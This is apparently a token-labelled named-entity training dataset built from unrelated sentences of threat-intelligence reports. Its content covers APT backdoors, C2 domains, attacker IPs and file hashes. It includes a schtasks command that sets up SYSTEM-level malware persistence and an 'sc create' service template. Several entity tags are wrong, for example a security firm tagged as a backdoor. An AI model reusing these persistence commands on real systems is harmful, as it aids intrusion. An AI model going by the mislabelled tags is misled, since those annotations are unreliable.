the	O
goals	O
they	O
had	O
set	O
for	O
the	O
attack	O
.	O

黑产研究	O
(	O
6	O
)	O

Purpose	O

www.fireeye.com/blog/threat-research/2016/06/irongate_ics_malware.html	B-url.normal

In	O
the	O
first	O
stage	O
of	O
the	O
attack	O
,	O
the	O
decrypted	O
shellcode	O
executed	O
by	O
the	O
exploit	O
downloads	O
and	O
executes	O
a	O
special	O
DLL	O
file	O
.	O

These	O
components	O
would	O
potentially	O
perform	O
additional	O
command	O
and	O
control	O
functions	O
and	O
potentially	O
exfiltration	O
from	O
the	O
central	O
host	O
.	O

Stealing	O
cryptocurrency	O
from	O
the	O
victim	O
's	O
workstation	O
:	O
Iron	B-malware.backdoor
backdoor	O
would	O
drop	O
the	O
latest	O
voidtool	O
Everything	O
search	O
utility	O
and	O
actually	O
silent	O
install	O
it	O
on	O
the	O
victim	O
's	O
workstation	O
using	O
msiexec	O
.	O

C:\%appdata\b.exe	O
JavaScript	O
present	O
in	O
Internet	O
Explorer	O
memory	O
space	O
.	O

This	O
happens	O
because	O
,	O
according	O
to	O
MSDN	O
,	O
'	O
Kernel	O
objects	O
are	O
securable	O
,	O
while	O
user	O
objects	O
and	O
GDI	O
objects	O
are	O
not	O
.	O

Figure	O
5	O
:	O
Example	O
POST	O
Request	O
From	O
the	O
Tofu	B-malware.backdoor
Backdoor	I-malware.backdoor

The	O
payload	O
communicates	O
to	O
the	O
server	O
using	O
HTTPS	O
protocol	O
,	O
making	O
it	O
impossible	O
to	O
eavesdrop	O
on	O
the	O
malicious	O
traffic	O
it	O
generates	O
.	O

Although	O
the	O
fi	O
lenames	O
will	O
likely	O
change	O
,	O
the	O
actual	O
method	O
will	O
likely	O
remain	O
.	O

The	O
only	O
difference	O
between	O
the	O
two	O
de-obfuscation	O
routines	O
is	O
how	O
many	O
bytes	O
are	O
XOR'ed	O
at	O
a	O
time	O
during	O
each	O
round	O
.	O

Check	O
if	O
the	O
binary	O
is	O
executed	O
on	O
a	O
VM	O
,	O
if	O
so	O
–	O
ExitProcess	O
2	O
.	O

DDOSHTTPFLOOD	O
,	O
etc	O
.	O

This	O
process	O
is	O
used	O
similarly	O
to	O
a	O
large-scale	O
enterprise	O
using	O
MDM	B-malware.infosteal
solutions	O
.	O

Appendix	B-hash
B	O
–	O
Indicators	O
of	O
Compromise	O
–	O
TLP	O
:	O
WHITE	O

to	O
analyze	O
On	O
March	O
20	O
,	O
2013	O
,	O
at	O
approximately	O
14.15PM	O
South	O
Korea	O
suffered	O
a	O
cyber	O
attack	O
that	O
resulted	O
in	O
the	O
denial	O
of	O
service	O
of	O
several	O
major	O
banks	O
and	O
broadcasters	O
.	O

According	O
to	O
the	O
terms	O
of	O
the	O
JCPOA	O
,	O
Tehran	O
agreed	O
to	O
restrictions	O
on	O
its	O
nuclear	O
weapons	O
program	O
in	O
exchange	O
for	O
sanctions	O
relief	O
.	O

For	O
example	O
,	O
when	O
executing	O
the	O
DLL	O
file	O
by	O
calling	O
the	O
NbhgHUxiGf	O
export	O
function	O
,	O
the	O
victim	O
would	O
be	O
prompted	O
with	O
a	O
Windows	O
message	O
box	O
with	O
'	O
jpcert-1	O
'	O
,	O
as	O
can	O
be	O
shown	O
in	O
Exhibit	O
3	O
and	O
4	O
.	O

2	O
.	O

Trend	O
Micro	O
About	O
TrendLabs	O
Security	O
Intelligence	O
Blog	O
Home	O
Search	O
:	O
Categories	O
Home	O
'	O
Malware	O
'	O
Lazarus	O
Campaign	O
Targeting	O
Cryptocurrencies	O
Reveals	O
Remote	O
Controller	O
Tool	O
,	O
an	O
Evolved	O
RATANKBA	B-malware.backdoor
,	O
and	O
More	O
Lazarus	O
Campaign	O
Targeting	O
Cryptocurrencies	O
Reveals	O
Remote	O
Controller	O
Tool	O
,	O
an	O
Evolved	O
RATANKBA	O
,	O
and	O
More	O

This	O
was	O
most	O
likely	O
created	O
to	O
test	O
the	O
effectiveness	O
of	O
the	O
library	O
prior	O
to	O
malicious	O
deployment	O
.	O

a	O
value	O
'	O
AppID	O
'	O
with	O
the	O
data	O
it	O
calculates	O
from	O
GetTickcount	O
(	O
)	O
,	O
used	O
as	O
an	O
identifier/mutex	O
.	O

A	O
200.63.46.23	B-ip.unknown
8	O
turbofirecoupon.com	B-url.unknown
.	O

We	O
provide	O
the	O
following	O
script	O
(	O
Figure	O
26	O
)	O
in	O
order	O
to	O
decrypt	O
them	O
.	O

Once	O
extracted	O
,	O
the	O
binary	O
of	O
'	O
Sample	O
A	O
'	O
has	O
the	O
following	O
properties	O
:	O

Any	O
technical	O
information	O
that	O
is	O
made	O
available	O
by	O
Symantec	O
Corporation	O
is	O
the	O
copyrighted	O
work	O
of	O
Symantec	O
Corporation	O
and	O
is	O
owned	O
by	O
Symantec	O
Corporation	O
.	O

Upon	O
initialization	O
,	O
it	O
is	O
decrypted	O
using	O
a	O
preliminary	O
crypto	O
key	O
comprised	O
only	O
of	O
the	O
first	O
two	O
components	O
(	O
e.g.	O
,	O
#	O
KCMDDC42F	O
#	O
-890	O
)	O
using	O
a	O
routine	O
we	O
've	O
labeled	O

C2	O
infrastructure	O
enumeration	O
reveals	O
overlap	O
between	O
the	O
three	O
samples	O
that	O
iDefense	O
analyzed	O
,	O
as	O
Exhibit	O
8	O
illustrates	O
.	O

The	O
backdoor	O
then	O
replies	O
with	O
a	O
beacon	O
message	O
,	O
the	O
contents	O
of	O
which	O
are	O
as	O
follows	O
:	O

Win32/TrojanDropper	O
.	O

If	O
the	O

The	O
exploit	O
implementation	O
includes	O
Chinese	O
terms	O
possibly	O
signifying	O
an	O
attempted	O
false	O
flag	O
or	O
a	O
Chinese	O
exploit	O
supplier	O
.	O

Mimikatz	B-malware.unknown
is	O
a	O
very	O
popular	O
tool	O
and	O
is	O
detected	O
by	O
most	O
antivirus	O
vendors	O
and	O
other	O
security	O
products	O
.	O

In	O
2012	O
,	O
Vietnam	O
introduced	O
new	O
censorship	O
laws	O
amidst	O
an	O
ongoing	O
harassment	O
,	O
intimidation	O
,	O
and	O
detention	O
campaign	O
against	O
of	O
bloggers	O
who	O
spoke	O
out	O
against	O
the	O
regime	O
.	O

Word	O
documents	O
attached	O
to	O
Inception	B-malware.backdoor
's	O
spear-phishing	O
emails	O
leveraged	O
two	O
Microsoft	O
O ce	O
vulnerabilities	O
(	O
CVE-2014-1761	O
(	O
https://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-1761	B-url.unknown
)	O
and	O
CVE-2012-0158	O
(	O
http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2012-0158	B-url.unknown
)	O
)	O
to	O
install	O
malware	O
on	O
the	O
recipient	O
's	O
computer	O
.	O

This	O
section	O
describes	O
how	O
the	O
malware	O
infects	O
the	O
target	O
machine	O
.	O

Unit	O
42	O
reverse	O
engineered	O
the	O
algorithm	O
and	O
created	O
the	O
function	O
seen	O
below	O
to	O
generate	O
hashes	O
in	O
order	O
to	O
determine	O
the	O
processes	O
Cmstar	B-malware.unknown
is	O
trying	O
to	O
find	O
:	O

Command	O
ID	O
Purpose	O

In	O
both	O
campaigns	O
,	O
each	O
attack	O
group	O
employed	O
multiple	O
overlapping	O
TTPs	O
to	O
infiltrate	O
their	O
targets	O
,	O
including	O
similar	O
custom	O
built	O
backdoors	O
and	O
remote	O
administration	O
tools	O
(	O
RATs	B-malware.backdoor
)	O
such	O
as	O
CT/NewCT	B-malware.backdoor
,	O
Mongall	B-malware.backdoor
and	O
Nflog	B-malware.backdoor

One	O
technique	O
is	O
to	O
modify	O
the	O
app	O
's	O
code	O
at	O
runtime	O
to	O
execute	O
the	O
malicious	O
code	O
—	O
this	O
has	O
been	O
observed	O
in	O
previously	O
analyzed	O
iOS	O
malware	O
.	O

In	O
our	O
lab	O
,	O
this	O
file	O
is	O
written	O
as	O
%	O
APPDATA%\adobe\adobe.bat	O
.	O

Going	O
back	O
to	O
the	O
IP	O
address	O
of	O
the	O
attackers	O
(	O
41.208.110.46	B-ip.unknown
)	O
,	O
it	O
is	O
very	O
important	O
to	O
discover	O
the	O
attackers	O
infrastructure	O
that	O
maybe	O
used	O
to	O
launch	O
wider	O
attacks	O
using	O
multiple	O
RATs	O
on	O
multiple	O
platforms	O
.	O

If	O
a	O
file	O
was	O
wiped	O
by	O
the	O
malware	O
then	O
it	O
will	O
still	O
be	O
wiped	O
,	O
or	O
partially	O
wiped	O
.	O

Russian	O
President	O
Vladimir	O
Putin	O
recently	O
described	O
the	O
Internet	O
as	O
'	O
an	O
invention	O
of	O
the	O
CIA	O
.	O
'	O

So	O
for	O
anyone	O
exploring	O
and	O
hunting	O
RTF	O
documents	O
you	O
may	O
also	O
want	O
to	O
start	O
looking	O
for	O
the	O
'	O
{	O
\rtx	O
'	O
header	O
.	O

2016	O
.	O

CROWDSTRIKE	O
IDENTIFIED	O
THIS	O
X-AGENT	B-malware.infosteal
VARIANT	O
WITHIN	O
A	O
LEGITIMATE	O
ANDROID	O
APPLICATION	O
NAMED	O
ПОПР-Д30.APK	B-malware.backdoor
.	O

When	O
we	O
'	O
dumped	O
'	O
the	O
RAT	O
to	O
the	O
disk	O
,	O
some	O
of	O
the	O
AV	O
tools	O
detect	O
it	O
with	O
the	O
following	O
signatures	O
:	O

Specifically	O
,	O
the	O
DLLs	O
dropped	O
have	O
used	O
file	O
and	O
export	O
names	O
also	O
used	O
by	O
OnionDuke	O
.	O

A	O
single	O
compromised	O
account	O
could	O
allow	O
TG-4127	B-malware.infosteal
to	O
achieve	O
its	O
operational	O
goals	O
.	O

d08f1211fe0138134e822e31a47ec5d4	B-hash
bitsran.exe	B-malware.drop
b27881f59c8d8cc529fa80a58709db36	B-hash
RSW7B37.tmp	B-malware.unknown
3c9e71400b72cc0213c9c3e4ab4df9df	B-hash
msmpeng.exe	O
0edbad9e6041d43f97c7369439a40138	B-hash
FileTokenBroker.dll	O
97aaf130cfa251e5207ea74b2558293d	B-hash
splwow32.exe	O
62217af0299d6e241778adb849fd2823	B-hash
N/A	O

http://www.trendmicro.com/cloud-content/us/pdfs/security-intelligence/	O
white-papers/wp_the_taidoor_campaign.pdf	O
Security	O
TechCenter	O
.	O

The	O
dropped	O
file	O
(	O
officeupdate.exe	O
)	O
is	O
then	O
executed	O
by	O
the	O
macro	O
code	O
using	O
the	O
PowerShell	O
script	O
.	O

Sorchornor_with_PM_-_	O
Sep_2017.exe	O

A	O
few	O
hits	O
were	O
found	O
throughout	O
the	O
drive	O
,	O
and	O
it	O
appeared	O
that	O
there	O
were	O
multiple	O
empty	O
VBR	O
templates	O
throughout	O
the	O
system	O
(	O
Shown	O
in	O
Figure	O
3	O
)	O
.	O

(	O
23	O
)	O
(	O
93	O
)	O
(	O
146	O
)	O
(	O
37	O
)	O

At	O
first	O
the	O
backdoor	O
failed	O
to	O
load	O
or	O
really	O
do	O
anything	O
in	O
my	O
VM	O
until	O
I	O
read	O
what	O
the	O
'	O
msascm32.drv	O
'	O
file	O
does	O
.	O

As	O
the	O
process	O
ID	O
and	O
check	O
code	O
are	O
different	O
,	O
the	O
transmitted	O
heartbeat	O
package	O
data	O
are	O
different	O
each	O
time	O
.	O

Though	O
many	O
of	O
the	O
malwares	O
we	O
have	O
examined	O
in	O
this	O
campaign	O
were	O
based	O
on	O
Python	O
,	O
a	O
number	O
of	O
similar	O
malware	O
files	O
were	O
found	O
to	O
be	O
based	O
on	O
a	O
different	O
scripting	O
language	O
–	O
AutoIt	O
.	O

00000048	O
90	O
AE	O
36	O
31	O
5D	O
40	O
A3	O
C0	O
5E	O
8A	O
4C	O
0F	O
0C	O
72	O
®61	O
]	O
@	O
£	O
À^	O
ŠLr	O

The	O
technique	O
of	O
storing	O
the	O
malicious	O
content	O
inside	O
the	O
TextBox	O
within	O

DHS	O
recommends	O
that	O
network	O
administrators	O
review	O
the	O
IP	O
addresses	O
,	O
file	O
hashes	O
,	O
and	O
Yara	O
signature	O
provided	O
and	O
add	O
the	O
IPs	O
to	O
their	O
watchlist	O
to	O
determine	O
whether	O
malicious	O
activity	O
has	O
been	O
observed	O
within	O
their	O
organizations	O
.	O

2013-08-20	O
2013-09-06	O
2013-12-20	O
2013-12-20	O
2013-12-20	O
2013-12-20	O
2013-12-20	O
2013-12-20	O
2013-12-20	O
www.ghostale[.]com	B-url.cncsvr
www.ycbackap[.]com	B-url.cncsvr
asp.skyppee[.]com	B-url.cncsvr
facebook.skyppee[.]com	B-url.cncsvr
pop.skyppee[.]com	B-url.cncsvr
mail.skyppee[.]com	B-url.cncsvr
mil.skyppee[.]com	B-url.cncsvr
web.pktmedia[.]com	B-url.cncsvr
bbs.pktmedia[.]com	B-url.cncsvr

One	O
or	O
all	O
of	O
them	O
may	O
be	O
factors	O
in	O
explaining	O
this	O
observed	O
activity	O
.	O

Different	O
colors	O
show	O
the	O
three	O
dropped	O
modules	O
:	O
legit	O
app	O
(	O
blue	O
)	O
,	O
Anti-detection	O
stages	O
.	O

cmd.exe	O
/c	O
schtasks	O
/create	O
/tn	O
'	O
BITSRAN	B-malware.drop
'	O
/tr	O
/s	O
/u	O
/p	O
/st	O
00:00	O
/et	O
23:59	O
/sc	O
minute	O
/mo	O
1	O
/ru	O
system	O
/f	O

DarkComet	B-malware.backdoor
is	O
known	O
to	O
be	O
a	O
popular	O
RAT	B-malware.backdoor
used	O
in	O
threat	O
activity	O
in	O
the	O
Middle	O
East	O
6,7.A	O
remote	O
access	O
tool	O
provides	O
an	O
attacker	O
with	O
full	O
control	O
over	O
the	O
victim	O
system	O
.	O

THE	O
AUTHENTICATION	O
ANALYSIS	O
ON	O
THE	O
TECHNOLOGY	O
SOURCES	O
OF	O
THIS	O
ATTACK	O
..............................................	O
7	O

However	O
,	O
it	O
is	O
difficult	O
to	O
distinguish	O
and	O
correlate	O
the	O
activity	O
of	O
targeted	O
threat	O
actors	O
based	O
solely	O
on	O
their	O
preference	O
to	O
use	O
particular	O
malware	O
—	O
especially	O
,	O
freely	O
available	O
malware	O
.	O

trojan	O
uefa	O
uefa	O
euro	O
2012	O
underground	O
update	O
url	O
uroburos	B-malware.backdoor
usb	O
virus	O

A	O
summary	O
of	O
the	O
capabilities	O
would	O
be	O
as	O
follows	O
:	O
-	O
Logging	O
keystrokes	O
-	O
Taking	O
screenshots	O
-	O
Capture	O
of	O
audio	O
streams	O
from	O
softphone	O
applications	O
-	O
Stealing	O
of	O
clipboard	O
data	O
-	O
System	O
and	O
user	O
default	O
language	O
,	O
keyboard	O
layout	O
-	O
Names	O
of	O
desktop	O
windows	O

Most	O
of	O
the	O
samples	O
we	O
have	O
observed	O
were	O
compiled	O
beginning	O
from	O
the	O
end	O
of	O
January	O
.	O

In	O
a	O
December	O
2012	O
interview	O
,	O
Marietje	O
Schaake	O
(	O
MEP	O
)	O
,	O
currently	O
the	O
rapporteur	O
for	O
the	O
first	O
EU	O
strategy	O
on	O
digital	O
freedom	O
in	O
foreign	O
policy	O
,	O
stated	O
that	O
it	O
was	O
'	O
quite	O
shocking	O
'	O
that	O
Europe	O
companies	O
continue	O
to	O
export	O
repressive	O
technologies	O
to	O
countries	O
where	O
the	O
rule	O
of	O
law	O
is	O
in	O
question	O
.	O

For	O
inter	O
process	O
communication	O
Babar	B-malware.drop
uses	O
named	O
pipes	O
.	O

A	O
virtualised	O
packer	O
is	O
used	O
.	O

The	O
code	O
for	O
this	O
web	O
shell	O
can	O
be	O
found	O
below	O
:	O

Use	O
a	O
unidirectional	O
gateway	O
rather	O
than	O
bidirectional	O
network	O
connections	O
for	O
any	O
applications	O
that	O
depend	O
on	O
the	O
data	O
provided	O
by	O
the	O
SIS	O
.	O

At	O
system	O
boot	O
time	O
the	O
regsvr32.exe	O
process	O
will	O
start	O
,	O
load	O
the	O
Babar	B-malware.drop
DLL	O
and	O
thus	O
'	O
deploy	O
'	O
the	O
malware	O
to	O
various	O
legitimate	O
processes	O
.	O

HTTP	O
GET	O
traffic	O
to	O
pages	O
with	O
paths	O
:	O

'	O
271	O
Russian	O
Athletes	O
Cleared	O
for	O
Rio	O
Games	O
.	O
'	O

Volexity	B-malware.backdoor
recommends	O
avoiding	O
this	O
website	O
and/or	O
browsing	O
with	O
caution	O
.	O

Because	O
the	O
shells	O
must	O
contain	O
a	O
predictable	O
syntax	O
,	O
researchers	O
can	O
quickly	O
attempt	O
to	O
find	O
files	O
that	O
have	O
that	O
code	O
in	O
play	O
.	O

AUDIO	O
CONTACTS	O
FS	O
(	O
)	O
START	O
,	O
STOP	O
,	O
RECORD_START	O
,	O
RECORD_STOP	O
COUNT	O
,	O
GET	O
APP	O
,	O
CD	O
,	O
DOWNLOAD	O
,	O
DOWNLOAD_STATUS	O
,	O
EXTERNAL	O
,	O
GET	O
,	O
INSTALL	O
,	O
INTERNAL	O
,	O
LS	O
,	O
MKDIR	O
,	O
PWD	O
,	O
RM	O
GETLOC	O
INFO	O
/	O
USER_INFO	O
PS	O
(	O
)	O
PHOTOS	O
TELEPHONE	O
KEEPALIVE	O
PING	O
VIDEO	O
LSX	O
,	O
GETX	O
,	O
LSI	O
,	O
GETI	O
,	O
TAKEPIC_FRONT	O
,	O
TAKEPIC_BACK	O
COUNT_CALL_LOGS	O
,	O
COUNT_SMS	O
,	O
GET_CALL_LOGS	O
,	O
GET_SMS	O

EB	O
52	O
90	O
4E	O
54	O
46	O
53	O
20	O
20	O
20	O
20	O
00	O
02	O
08	O
00	O
00	O
00	O
00	O
00	O
00	O
00	O
F8	O
00	O
00	O
3F	O
00	O
FF	O
00	O
3F	O
00	O
00	O
00	O
00	O
00	O
00	O
00	O
80	O
00	O
80	O
00	O
C0	O
F8	O
F8	O
0D	O
00	O
00	O
00	O
00	O
00	O
00	O
0C	O
00	O
00	O
00	O
00	O
00	O
8C	O
8F	O
DF	O
00	O
00	O
00	O
00	O
00	O
F6	O
00	O
00	O
00	O
01	O
00	O
00	O
00	O
26	O
FA	O
CA	O
70	O
02	O
CB	O
70	O
44	O
00	O
00	O
00	O
00	O
[	O
...	O
Truncated	O
for	O
size	O
...	O
]	O
00	O
00	O
55	O
AA	O
EB	O
52	O
90	O
–	O
Instruction	O
to	O
jump	O
to	O
boot	O
code	O
(	O
Not	O
necessary	O
for	O
our	O
application	O
)	O
4E	O
54	O
46	O
53	O
20	O
20	O
20	O
20	O
–	O
OEM	O
Name	O
(	O
NTFS	O
)	O
00	O
02	O
–	O
Bytes	O
per	O
sector	O
,	O
0x0200	O
=	O
512	O
Bytes	O
.	O

is	O
used	O
for	O
generating	O
XAgent	O
's	O
file	O
path	O
on	O
the	O

•	O
Increasing	O
reliance	O
on	O
public	O
code	O
depositories	O
,	O
such	O
as	O
Carberp	O
,	O
PowerShell	O
Empire	O
,	O
P.A.S.	O
webshell	O
,	O
Metasploit	O
modules	O
,	O
and	O
others	O
in	O
a	O
likely	O
effort	O
to	O
accelerate	O
their	O
development	O
cycle	O
and	O
provide	O
plausible	O
deniability	O
.	O

Several	O
months	O
ago	O
I	O
examined	O
a	O
malware-tainted	O
Word	O
document	O
titled	O
'	O
ISIS_twitter_list.doc	O
.	O
'	O

Based	O
on	O
the	O
geolocation	O
evidence	O
provided	O
in	O
this	O
paper	O
,	O
it	O
appears	O
that	O
different	O
operators	O
executed	O
the	O
Moafee	B-malware.infosteal
and	O
DragonOK	B-malware.infosteal
campaigns	O
.	O

Figure	O
1	O
:	O

That	O
address	O
we	O
came	O
up	O
with	O
is	O
0x0142BFEE	O
(	O
Figure	O
12	O
)	O
.	O

Command	O
codes	O
are	O
sent	O
by	O
the	O
attacker	O
instructing	O
the	O
victim	O
what	O
to	O
do	O
.	O

TsHi	B-malware.unknown
is	O
the	O
high-level	O
interface	O
created	O
by	O
the	O
malware	O
's	O
authors	O
that	O
allows	O
the	O
threat	O
actor	O
's	O
operators	O
to	O
implement	O
attack	O
scripts	O
using	O
the	O
TRITON	B-malware.infosteal
framework	O
.	O

Figure	O
5	O
:	O
GET	O
Request	O
with	O
minimal	O
HTTP	O
headers	O
Converting	O
the	O
shellcode	O
to	O
ASCII	O
and	O
removing	O
the	O
non-printable	O
characters	O
provides	O
a	O
quick	O
way	O
to	O
pull	O
out	O
network-based	O
indicators	O
(	O
NBI	O
)	O
from	O
the	O
shellcode	O
.	O

sc	O
create	O
<	O
service	O
name	O
>	O
<	O
service	O
name	O
>	O
'	O
%	O
SystemRoot%\System32\svchost.exe	O
-k	O
netsvcs	O
'	O

2012_3_12.xls	O

createEncodeData	O
:	O
size_data	O
:	O
size_result_data	O
:	O
]	O

The	O
decrypted	O
data	O
also	O
contains	O
shellcode	O
.	O

CrowdStrike	O
Intelligence	O
assesses	O
a	O
tool	O
such	O
as	O
this	O
has	O
the	O
potential	O
ability	O
to	O
map	O
out	O
a	O
unit	O
's	O
composition	O
and	O
hierarchy	O
,	O
determine	O
their	O
plans	O
,	O
and	O
even	O
triangulate	O
their	O
approximate	O
location	O
.	O

Fig	O
3	O
.	O

x509	O
fingerprint	O

For	O
clients	O
using	O
Gmail	O
as	O
a	O
corporate	O
mail	O
solution	O
,	O
educate	O
users	O
about	O
the	O
risk	O
of	O
spoofed	O
login	O
pages	O
and	O
encourage	O
them	O
to	O
confirm	O
they	O
are	O
on	O
the	O
legitimate	O
Google	O
Accounts	O
page	O
when	O
presented	O
with	O
a	O
Google	O
login	O
prompt	O
.	O

DHS	O
offers	O
a	O
variety	O
of	O
resources	O
for	O
organizations	O
to	O
help	O
recognize	O
and	O
address	O
their	O
cybersecurity	O
risks	O
.	O

The	O
password	O
itself	O
is	O
actually	O
stored	O
as	O
an	O
encrypted	O
resource	O
.	O

C	O
:	O
\Users\John\Documents\Visual	O
Studio	O
2012\Projects\Data	O
Protector	O
v2\atiapfxx\atiapfxx\bin\Release\Obfuscated\atiapfxx.pdb	O

FANCY	O
BEAR	O
(	O
also	O
known	O
as	O
Sofacy	O
or	O
APT	O
28	O
)	O
is	O
a	O
separate	O
Russian-based	O
threat	O
actor	O
,	O
which	O
has	O
been	O
active	O
since	O
mid	O
2000s	O
,	O
and	O
has	O
been	O
responsible	O
for	O
targeted	O
intrusion	O
campaigns	O
against	O
the	O
Aerospace	O
,	O
Defense	O
,	O
Energy	O
,	O
Government	O
and	O
Media	O
sectors	O
.	O

Pafish	O
will	O
enumerate	O
and	O
look	O
for	O
known	O
virtualization	O
and	O
sandbox	O
artifacts	O
and	O
then	O
print	O
results	O
back	O
to	O
the	O
researcher	O
screen	O
.	O

After	O
that	O
,	O
the	O
starter	O
executes	O
the	O
very	O
Team	O
Viewer	O
client	O
netsvcs.exe	O
.	O

The	O
attackers	O
have	O
made	O
an	O
unusual	O
choice	O
with	O
respect	O
to	O
the	O
hosting	O
providers	O
used	O
for	O
the	O
malicious	O
infrastructure	O
.	O

pshdll35.dll	O
pshdll40.dll	O

Figure	O
3	O
–	O
The	O
ransom	O
demand	O
displayed	O
by	O
KillDisk	B-malware.ransom
in	O
the	O
second	O
wave	O
of	O
December	O
2016	O
attacks	O
.	O

Consistent	O
use	O
of	O
obfuscated	O
.hta	O
downloaders	O

It	O
also	O
turns	O
off	O
the	O
Windows	O
Security	O
Center	O
service	O
to	O
prevent	O
alerting	O
the	O
user	O
about	O
the	O
disabled	O
firewall	O
.	O

The	O
malware	O
uses	O
RootTools	B-malware.unknown
and	O
RootShell	B-malware.unknown
components	O
to	O
make	O
root	O
privileged	O
tasks	O
easy	O
in	O
Android	O
.	O

The	O
dwEncryptionKey	O
is	O
the	O
32-bit	O
XOR	O
encryption	O
key	O
for	O
the	O
payload	O
section	O
.	O

The	O
dropper	O
operates	O
straight	O
forward	O
;	O
it	O
fetches	O
the	O
encrypted	O
DLL	O
from	O
its	O
own	O
binary	O
from	O
outside	O
its	O
resource	O
section	O
,	O
decrypts	O
it	O
and	O
hides	O
it	O
in	O
the	O
file	O
system	O
.	O

We	O
took	O
the	O
second	O
option	O
and	O
reused	O
the	O
existing	O
code	O
for	O
decoding	O
strings	O
,	O
for	O
faster	O
analysis	O
of	O
the	O
sample	O
.	O

The	O
victims	O
of	O
this	O
spyware	O
campaign	O
were	O
tricked	O
into	O
downloading	O
the	O
spyware	O
themselves	O
because	O
they	O
trusted	O
the	O
girls	O
they	O
were	O
talking	O
to	O
online	O
,	O
despite	O
never	O
meeting	O
them	O
in	O
person	O
.	O

-	O
exact	O
functionality	O
unknown	O
appears	O
to	O
force	O
another	O
request	O
to	O
the	O
C2	O
page	O
check.asp	O
#	O
stop	O
!	O

File	O
name	O
SHA-1	O
hash	O

name=GeorgeBush	O
&	O
userid=	O
<	O
4	O
digit	O
number	O
>	O
&	O
other=	O

However	O
,	O
because	O
dnc.org	O
email	O
accounts	O
were	O
targeted	O
in	O
the	O
same	O
way	O
as	O
hillaryclinton.com	B-url.normal
accounts	O
,	O
it	O
is	O
likely	O
that	O
dnc.org	O
did	O
use	O
Gmail	O
at	O
that	O
time	O
and	O
later	O
moved	O
to	O
a	O
different	O
service	O
.	O

MaxNothingSaidCount	O
:	O
00000078	O
DWORD	O

These	O
will	O
be	O
executed	O
to	O
perform	O
the	O
main	O
routine	O
.	O

Figure	O
8	O
–	O
The	O
multistage	O
attack	O
scheme	O
.	O

Most	O
HIPS	O
tools	O
whitelist	O
signed	O
or	O
trusted	O
files	O
,	O
thereby	O
excluding	O
any	O
malware	O
loaded	O
using	O
DLL	B-malware.backdoor
hijacking	O
by	O
those	O
signed	O
files	O
from	O
any	O
behavior	O
monitoring	O
.	O

After	O
decryption	O
after	O
downloading	O
,	O
the	O
process	O
is	O
exactly	O
the	O
same	O
as	O
the	O
format	O
of	O
the	O
previous	O
image	O
steganography	O
transmission	O
.	O

download	O
the	O
component	O
files	O
.	O

Additionally	O
,	O
the	O
strings	O
in	O
the	O
DLLs	O
have	O
been	O
encrypted	O
using	O
the	O
same	O
algorithm	O
used	O
by	O
OnionDuke	O
.	O

The	O
victims	O
had	O
to	O
adjust	O
their	O
device	O
settings	O
to	O
install	O
apps	O
from	O
unknown	O
sources	O
,	O
before	O
installing	O
the	O
fake	O
messaging	O
app	O
.	O

'	O
Rid	O
,	O
Thomas	O
.	O

ASPECT	O
DESCRIPTION	O
Operators	O
Intent	O
Coms	O

After	O
a	O
protracted	O
22	O
year	O
legal	O
battle	O
,	O
Sarabjit	O
Singh	O
would	O
become	O
the	O
victim	O
of	O
a	O
severe	O
beating	O
by	O
Pakistani	O
prisoners	O
and	O
would	O
later	O
die	O
of	O
his	O
injuries	O
in	O
a	O
Lahore	O
hospital	O
on	O
May	O
2	O
,	O
2013	O
.	O

The	O
svchost.exe	B-malware.drop
initiates	O
an	O
outbound	O
connection	O
to	O
a	O
command	O
and	O
control	O
(	O
C2	O
)	O
server	O
hosted	O
at	O
thejoe.publicvm.com	O
.	O

Yet	O
,	O
our	O
research	O
and	O
analysis	O
suggest	O
that	O
Iranian	O
security	O
forums	O
may	O
play	O
a	O
role	O
in	O
staffing	O
and	O
knowledge	O
sharing	O
for	O
Iranian	O
contractors	O
.	O

Distribution	O
and	O
Delivery	O

This	O
document	O
can	O
not	O
be	O
modified	O
or	O
converted	O
to	O
any	O
other	O
electronic	O
or	O
machine-readable	O
form	O
in	O
whole	O
or	O
in	O
part	O
without	O
prior	O
written	O
approval	O
of	O
Fidelis	O
Security	O
Systems	O
,	O
Inc	O
.	O

Username	O
of	O
the	O
Windows	O
machine	O
is	O
admin	O
.	O

Create	O
processes	O
Write	O
responses	O
from	O
the	O
control	O
server	O
to	O
a	O
file	O
Send	O
information	O
for	O
all	O
drives	O
Write	O
data	O
sent	O
by	O
the	O
control	O
server	O
to	O
a	O
temporary	O
file	O
matching	O
the	O
file	O
path	O
pattern	O
%	O
temp	O
%	O
\DWS00*	O
Change	O
the	O
time	O
of	O
a	O
file	O
as	O
specified	O
by	O
the	O
control	O
server	O
The	O
malware	O
changing	O
the	O
file	O
time	O
.	O

Without	O
the	O
time	O
stamp	O
change	O
,	O
the	O
Web	B-malware.ransom
shell	O
easily	O
stands	O
out	O
because	O
it	O
is	O
newer	O
than	O
the	O
other	O
two	O
files	O
.	O

ChessMaster	O
Adds	O
Updated	O
Tools	O
to	O
Its	O
Arsenal	O
Monero-Mining	O
HiddenMiner	B-malware.unknown
Android	O
Malware	O
Can	O
Potentially	O
Cause	O
Device	O
Failure	O
A	O
Closer	O
Look	O
at	O
Unpopular	O
Software	O
Downloads	O
and	O
the	O
Risks	O
They	O
Pose	O
to	O
Organizations	O
Cluster	O
of	O
Coins	O
:	O
How	O
Machine	O
Learning	O
Detects	O
Cryptocurrency-mining	O
Malware	O
Pop-up	O
Ads	O
and	O
Over	O
a	O
Hundred	O
Sites	O
are	O
Helping	O
Distribute	O
Botnets	O
,	O
Cryptocurrency	O
Miners	O
and	O
Ransomware	O

After	O
the	O
execution	O
,	O
the	O
polling	O
cycle	O
continues	O
.	O

However	O
,	O
unlike	O
the	O
other	O
two	O
websites	O
,	O
the	O
People	O
Power	O
website	O
did	O
not	O
contain	O
JavaScript	O
modifications	O
pointing	O
to	O
javase.com	B-url.normal
.	O

From	O
the	O
software	O
it	O
detects	O
,	O
we	O
get	O
the	O
impression	O
that	O
the	O
malware	O
is	O
focusing	O
on	O
a	O
specific	O
geolocation	O
as	O
its	O
target	O
.	O

The	O
last	O
technique	O
uses	O
the	O
MAC	O
Address	O
of	O
the	O
infected	O
system	O
.	O

These	O
changes	O
are	O
not	O
only	O
indicative	O
of	O
APT28	B-malware.infosteal
's	O
skills	O
,	O
resourcefulness	O
,	O
and	O
desire	O
to	O
maintain	O
operational	O
effectiveness	O
,	O
but	O
also	O
highlight	O
the	O
longevity	O
of	O
the	O
group	O
's	O
mission	O
and	O
its	O
intent	O
to	O
continue	O
its	O
activities	O
for	O
the	O
foreseeable	O
future	O
.	O

Subbrute	O
